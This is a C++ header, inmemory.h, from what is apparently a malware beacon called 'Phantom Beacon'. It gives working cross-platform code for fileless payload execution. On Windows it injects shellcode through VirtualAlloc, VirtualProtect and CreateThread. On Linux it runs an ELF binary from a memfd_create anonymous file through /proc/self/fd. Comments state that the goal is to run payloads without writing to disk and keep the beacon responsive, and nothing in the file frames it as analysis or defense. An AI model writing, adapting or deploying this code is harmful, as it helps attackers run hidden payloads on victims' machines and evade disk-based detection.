#pragma once
// ============================================================================
//  inmemory.h — Phantom Beacon In-Memory Execution (Cross-Platform)
//  ──────────────────────────────────────────────────────────────────────
//  Executes payloads without writing to disk.
//  Windows: Shellcode injection via VirtualAlloc.
//  Linux: Binary execution via memfd_create.
// ============================================================================

#include <vector>
#include <string>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#endif

namespace inmemory {

#ifdef _WIN32
// Execute Shellcode on Windows
inline bool run_shellcode(const std::vector<unsigned char>& shellcode) {
    if (shellcode.empty()) return false;

    LPVOID pMemory = VirtualAlloc(nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pMemory) return false;

    RtlMoveMemory(pMemory, shellcode.data(), shellcode.size());

    DWORD oldProtect;
    if (!VirtualProtect(pMemory, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return false;
    }

    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)pMemory, nullptr, 0, nullptr);
    if (!hThread) {
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return false;
    }

    // We don't wait for the thread here so the beacon remains responsive
    CloseHandle(hThread);
    return true;
}
#else
// Execute ELF Binary on Linux via memfd_create
inline bool run_binary(const std::vector<unsigned char>& binary, const std::string& args = "") {
    if (binary.empty()) return false;

    // Create an anonymous file in memory
    int fd = memfd_create("phantom_mem", MFD_CLOEXEC);
    if (fd == -1) return false;

    // Write binary to the anonymous file
    if (write(fd, binary.data(), binary.size()) != (ssize_t)binary.size()) {
        close(fd);
        return false;
    }

    pid_t pid = fork();
    if (pid == 0) { // Child
        // Execute the memory file via /proc/self/fd/
        char fd_path[64];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
        
        // Prepare arguments (very basic)
        execl(fd_path, "phantom_payload", (char*)NULL);
        _exit(1);
    } else if (pid > 0) { // Parent
        close(fd);
        return true;
    }

    close(fd);
    return false;
}
#endif

} // namespace inmemory
